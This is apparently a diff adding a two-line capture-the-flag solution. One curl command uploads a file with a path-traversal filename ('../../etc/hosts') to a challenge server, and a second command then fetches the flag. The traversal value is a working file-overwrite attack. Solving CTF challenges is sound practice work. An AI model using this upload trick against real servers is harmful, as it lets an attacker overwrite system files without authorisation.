@@ -1,0 +1,2 @@
+curl 'https://hostility.chal.imaginaryctf.org/upload' -F 'file=@hosts; filename=../../etc/hosts'
+curl 'https://hostility.chal.imaginaryctf.org/flag'
